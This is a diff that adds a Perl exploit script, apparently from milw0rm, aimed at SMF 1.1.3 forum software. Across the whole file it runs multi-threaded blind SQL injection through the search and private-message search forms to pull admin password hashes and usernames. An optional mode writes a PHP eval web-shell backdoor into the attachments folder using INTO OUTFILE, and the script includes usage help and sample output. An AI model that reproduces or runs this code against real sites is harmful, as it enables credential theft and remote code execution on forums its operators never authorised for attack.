@@ -1,0 +1,322 @@
+#!/usr/bin/perl
+
+#Written By Michael Brooks
+#contact: th3(dot)r00k(at)gmail(dot)com
+
+#SMF 1.1.3 Extremely fast Blind SQL Injection Exploit!
+#	-Binary Search
+#	-Multi-Threaded
+#	-NO benchmark()'s
+#
+#Two SQL Injection flaws.
+#Works with magic_quotes_gpc=On or Off. 
+#Total Bypass of SMF's SQL Injection filter.
+
+#I submitted a patch for these flaws:
+#http://www.simplemachines.org/community/index.php?topic=196380.0
+
+#I would like to thank RetroGod for being so skilled and willing to help me out. 
+
+#**Warning** perl will somtimes seg fault when useing threads.
+#Tested Under Linux
+
+use LWP::UserAgent;
+use threads;
+use Thread::Semaphore;
+
+	#global variables
+	my $threads=1;
+	my $semaphore = new Thread::Semaphore; 
+	my $globPos : shared=1;
+	my $oper : shared;
+	my @result : shared;
+	my $target;
+	my $cookie=false;
+	
+	$type="sleep";
+
+	main();#execute main
+	sub main{
+		$n=$threads;
+		$u=$p=$b=1;
+		$start_time=time;
+		$e=1;
+		#Process arguments passed by the command line.
+		for($v=0;$v<=$#ARGV;$v++){
+			if(substr($ARGV[$v],0,1) eq '-'){
+				$var=substr($ARGV[$v],1);
+				$$var=$ARGV[$v+1];
+			}
+		}
+		
+		@t=split('\?',$t);
+		@t=split('index.php',@t[0]);
+		$target=@t[0];
+		if(index($target,"/",length($target)-1)==-1){
+			$target=$target.'/';
+		}
+		if($e!=1){
+			print "\nExample:\n";
+			print "\nbrooks@TheLab:~/code/exploits\$ ./smf_blind_sql.pl -p  -u admin -t http://127.0.0.1/smf_1-1-3/index.php -n 4 -c SMFCookie218=a%3A4%3A%7Bi%3A0%3Bs%3A1%3A%222%22%3Bi%3A1%3Bs%3A40%3A%22091feddbd31bfa96932a5e4e6c34cb36f2686c1a%22%3Bi%3A2%3Bi%3A1378168836%3Bi%3A3%3Bi%3A1%3B%7D 
+\n\nSMF Is Vulnerable!
+Finding Password Hash for the Name: 'admin'
+Please Standby...
+
+Password Hash:
+1d94709528bb1c83d08f3088d4043f4742891f4f
+This attack used 161 HTTP requests and took 8 seconds to complete.
+EOF\n\n";
+			die();
+		}
+		$cookie=$c;
+		$user=$u;
+		if($n != 1){
+			$threads=$n;
+		}
+		#Check to make sure the target is vulnerable
+		if($b!=1||$p!=1){
+			$vulnerable=1;
+			#Yes I am assuming the default table prefix,  its a shame you can't access information_schema.
+			#No prefix is needed for the non-cookie attack becase I do not need a union select or sub-select!
+			bin_finder(2,1,"1","smf_members","and 1!=1");
+			if(int(@result[0])!=0){
+				$vulnerable=0;
+			}
+			$globPos=1;
+			bin_finder(2,1,"1","smf_members","and 1=1");
+			if(int(@result[0])!=1){
+				$vulnerable=0;
+			}
+			if($vulnerable==1){
+				print "SMF Is Vulnerable!\n"
+			}else{
+				print "\nATTACK FAILED!\n\n";
+				if($cookie){
+					print "Try sending a private message to your self or SMF might be patched.\n"
+				}else{
+					print "The non-cookie attack requires MySQL 5 so try using the exploit with -c or SMF might be patched.\n"
+				}
+				die();
+			}
+		}
+
+		$m=0;
+		if($p!=1){
+			if($user != 1){
+				print "Finding Password Hash for the Name: '$user'\n Please Standby...\n";				
+				for(my $x=0;$x<$threads;$x++){
+					#@threads[$x]=new threads \&bin_finder,16,40,"(conv(SUBSTRING(passwd,%s,1),16,10))=%s", "smf_members"," and memberName = '".$user."'";
+					@threads[$x]=new threads \&bin_finder,16,40,"conv(SUBSTRING(passwd,%s,1),16,10)", "smf_members"," and memberName =". hex_encode($user);
+				}
+				for(my $x=0;$x<$threads;$x++){
+					@threads[$x]->join;
+				}
+				print "\nPassword Hash:\n";
+				foreach $y (@result){
+					print sprintf("%x",$y);
+				}
+			}else{#
+				print "Finding An Administrative Credental.\n Please Standby...\n";
+				#bin_finder(128 ,1,"count(memberName)","smf_members"," and ID_GROUP=1 ");#single thread
+				#$admin_count=@result[0];
+				#$globPos=1;
+				#print "There are $admin_count admins on this forum.\n";
+				#for($a=0;$a<$admin_count;$a++){
+					for(my $x=0;$x<$threads;$x++){
+						@threads[$x]=new threads \&bin_finder,16,40,"conv(SUBSTRING(passwd,%s,1),16,10)", "smf_members"," and ID_MEMBER=1  ";
+					}
+					for(my $x=0;$x<$threads;$x++){
+						@threads[$x]->join;
+					}
+					print "\nPassword Hash:\n";
+					foreach $y (@result){
+						print sprintf("%x",$y);
+					}
+					$globPos=1;
+					bin_finder(256,1,"char_length(memberName)","smf_members"," and ID_MEMBER=1  ");#single thread
+					$name_len=@result[0];
+					$globPos=1;
+					
+					for($x=0;$x<$threads;$x++){
+						@threads[$x]=new threads \&bin_finder,128,$name_len,"ASCII(SUBSTRING(memberName,%s,1))", "smf_members"," and ID_MEMBER=1  ";
+					}
+					for($x=0;$x<$threads;$x++){
+						@threads[$x]->join;
+					}
+					print "\nName:\n";
+					for($l=0;$l<=$name_len;$l++){
+						print sprintf("%c",@result[$l]);
+					}
+					print "\n";
+					@result=null;
+					$globPos=1;
+				#}
+			}
+		}elsif($b!=1){
+			if(!$cookie){
+				die("\nA cookie is needed for this attack!\n");
+			}
+			print "Determining the exact path to place the backdoor. \n Please standby...\n";
+			bin_finder(512,1,"char_length(value)","smf_settings"," and variable = 'attachmentUploadDir'");#single thread
+			$length=@result[0];
+			$globPos=1;
+			for(my $x=0;$x<$threads;$x++){
+				@threads[$x]=new threads \&bin_finder,128,$length,"ASCII(SUBSTRING(value,%s,1))", "smf_settings"," and variable = 'attachmentUploadDir'";
+			}
+		
+			for(my $x=0;$x<$threads;$x++){
+				@threads[$x]->join;
+			}
+			$path='';
+			print "Path Disclosed:";
+			foreach $y (@result){
+				$path.=sprintf("%c" ,$y);
+			}
+			print $path."\n";
+			#$path=~s/_/?/g;#This accounts for the search request being modfied by SMF.
+			#$path=~s/%/*/g;
+			$r=rand();#Random file name so the attack will succeed multiple times against the same target. 
+			my $ua = LWP::UserAgent->new;
+			$ua->agent("Firebird");
+			$ua->default_header("Cookie"=>$cookie);#Its tricky to get double quotes for the outfile statement.
+			$load="\\,union select ".hex_encode("<?php eval(\$_GET[e]);?>").' into outfile  "","'.$path.'/'.$r.'.php",""#';		
+			$tst= $ua->post($target."?action=pm;sa=search2",["advanced"=>"1","search"=>"1","searchtype"=>"1","userspec"=>$load,"minage"=>"0","maxage"=>"9999","sort"=>"ID_PM%7Cdesc","submit"=>"Search"]);
+			$oper++;
+			print "\nEval Backdoor:\n".$target."attachments/".$r.".php?e=phpinfo();\n"
+		}else{
+			$m=1;
+			print "A Very Fast Blind Sql Injection Exploit for SMF 1.1.3.\n\n";
+			print "-p		obtain passwords (if used without -u,  then an admin credential will be obtained)\n";
+			print "-b		installs a backdoor using 'into outfile'. (requires -c)  **WARNING** SMF will log this as a single 'Hacking Attempt'!\n"; 
+			print "-t 		target\n";
+			print "-c		A valid cookie(Much faster attack)\n";
+			print "\nAditional:\n";
+			print "-u		obtains the password for a user name\n";
+			print "-n		number of threads\n";
+			print "-e		Shows an Example.\n";
+			print "The password hash is generated as:\n";
+			print "sha1(strtolower($username) . $password);\n\n";
+
+		}
+		if($m!=1){
+			$t=time-$start_time;
+			print "\nThis attack used $oper HTTP requests and took $t seconds to complete.";
+			print "\nEOF\n";
+		}
+	}
+	
+	#Takes complex input to build the request,  returns a simple bool. 
+	sub bin_ask{
+		my $if = shift;
+		my $table=shift;
+		my $where = shift;
+		my $ua = shift;
+		my $f=0;
+		if(!$cookie){
+			#no union select or sub-select needed for this attack!
+			$a=time();
+			#die($where);
+			#$where="and realName = ".hex_encode("admin");
+			$load="\"\\\",\" or  (IF(".$if.",sleep(10),1) $where) limit 1,1 #\"";	
+			$load=~s/_/?/g;#This accounts for the search request being modfied by SMF.
+			$load=~s/%/*/g;
+			$tst= $ua->post($target."?action=search2",["advanced"=>"1","search"=>"1","searchtype"=>"1","userspec"=>$load,"minage"=>"0","maxage"=>"9999","sort"=>"relevance%7Cdesc","brd%5B1%5D"=>1,"submit"=>"Search"]);
+			$page= $tst->content;
+			#print "<br>page:".$page;die;
+			$t= time();
+			#print "\n 1:time\n".$t."\n\n";
+			if($t-$a>=10){
+				$f=1;
+			}
+		}else{#%sunion select bypasses SMF's filter so i can use a sub-select in the following query.
+			$load="\\,union select ".hex_encode("1)) or (1!=\"'\") and (select (IF((".$if."),true,false)) from ".$table." where 1 ".$where.") or (1!=\"'\") and pmr.ID_MEMBER = 1#'").' # ';#sql comments still work in SMF		
+			$tst= $ua->post($target."?action=pm;sa=search2",["advanced"=>"1","search"=>"1","searchtype"=>"1","userspec"=>$load,"minage"=>"0","maxage"=>"9999","sort"=>"ID_PM%7Cdesc","submit"=>"Search"]);
+			$page= $tst->content;
+			#print $page; die ;		
+			if(index($page,"No Messages Found")==-1){
+				$f=1;
+			}
+		}
+		return $f;
+	}
+
+	#worker thread
+	sub bin_finder{
+		my $base=shift;
+		my $length=shift;
+		my $question=shift;
+		my $table=shift;
+		my $where=shift;
+		#One UserAgent object is used per thread.
+		my $ua = LWP::UserAgent->new;
+		$ua->agent("Firebird");
+		$ua->default_header("Cookie"=>$cookie);
+			
+		#binary search:
+		while($globPos<=$length){
+			$semaphore->down;
+				$c=$globPos;
+				$globPos++;	
+			$semaphore->up;
+			my $n=$base-1;
+			my $low=0;
+			my $floor= $low;
+			my $high=$n-1;
+			my $pos= $low+(($high-low)/2);
+			my $f=1;
+			while($low<=$high&&$f){
+				if(!$cookie){
+					$great="GREATEST(".sprintf($question,$c).",".$pos.")!=".$pos;#bypass the filter for the < and > characters 
+					 $less ="LEAST(".sprintf($question,$c).",".$pos.")!=".$pos;
+				}else{
+					$great=sprintf($question,$c).">".$pos;
+					$less=sprintf($question,$c)."<".$pos;				
+				}
+				if(bin_ask($great, $table,$where,$ua)){#asking the sql database if the current value is greater than $pos
+					$oper++;
+					if($pos==$n-1){#if this is true then the value must be the modulus. 
+						@result[$c-1]=$pos+1;
+						#print "\nDBG found:$c:ascii:".sprintf('%c',$pos)."\n";
+						$f=0;
+					}else{
+						$low=$pos+1;
+					}
+				}elsif(bin_ask($less, $table,$where,$ua)){#asking the sql database if the current value is less than $pos
+					$oper++;
+					if($pos==$floor+1){#if this is true the value must be zero.
+						@result[$c-1]=$pos-1;
+						#print "\nDBG found:$c:ascii:".sprintf('%c',$pos)."\n";
+						$f=0;
+					}else{
+						$high=$pos-1;
+					}
+				}else{
+					#both greater than and less then where asked, so thats two http requests. 
+					$oper++;
+					$oper++;
+					@result[$c-1]=$pos;
+					#print "\nDBG found:$c:ascii:".sprintf('%c',$pos)."\n";,,
+					$f=0;
+				}
+				 $pos=$low+(($high-$low)/2);
+			}
+		}
+	}
+#hex_encode was ported from one of RetroGod's php exploits.
+#Thanks be to rGod for telling me about this encoding method on milw0rm's forum back when it was still up.  
+#rGot you are leet!  
+sub hex_encode{
+  my $my_string=shift;
+  my $encoded="0x";
+  my $len=length($my_string);
+  for ($k=0; $k<$len; $k++){
+	$temp=sprintf("%X",ord(substr($my_string,$k,1)));
+	if (length($temp)==1) {
+		$temp="0".$temp;
+	}
+	$encoded.=$temp;
+  }
+  return $encoded;
+}
+
+# milw0rm.com [2007-10-20]
